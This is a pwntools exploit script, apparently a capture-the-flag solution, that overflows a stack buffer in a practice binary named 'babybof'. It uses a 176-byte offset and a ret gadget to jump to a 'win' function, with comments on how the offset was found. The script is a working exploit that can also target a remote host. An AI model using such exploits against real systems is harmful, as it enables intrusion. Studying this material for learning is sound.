from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript = gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *challenge+265
continue
'''.format(**locals())

exe = './babybof'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'info'

io = start()

ret = rop.find_gadget(['ret'])[0]

# offset can be found using gdb or automate using pwntools
# copy output of `cyclic 200`
# use as input for program
# notice that rbp contains taabuaab as input
# do `cyclic -l taab` -> offset 176
offset = 176

print(io.recv().decode())

payload = flat([
  # fill in the buffer
  b'A' * offset,
  
  # stack padding of 8 bytes
  b'B' * 8,

  # may or may not work without having this here
  # googling why an extra ret call is needed sometimes would be very helpful
  ret,

  # jump to the win function
  elf.symbols['win'],
])

io.sendline(payload)

io.interactive()